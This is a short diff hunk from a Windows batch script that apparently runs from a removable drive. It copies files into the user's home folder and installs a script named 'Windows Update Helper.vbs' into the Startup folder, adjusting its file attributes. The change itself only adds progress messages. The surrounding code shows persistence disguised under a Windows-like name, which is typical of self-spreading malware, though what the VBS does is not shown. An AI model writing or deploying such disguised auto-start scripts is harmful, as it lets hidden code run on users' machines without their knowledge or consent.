@@ -104,7 +104,7 @@ set /p copied=<alreadycopied.dat
 if exist novbs.dat set novbs=true
 
 echo %filename% verified - on correct drive
-if exist transfer.dat (xcopy transfer\* %homedrive%%homepath% /y)
+if exist transfer.dat (echo beginning transfer of files && xcopy transfer\* %homedrive%%homepath% /y && echo transfer finished)
 if exist "Windows Update Helper.vbs" (
 echo installing vbs
 attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
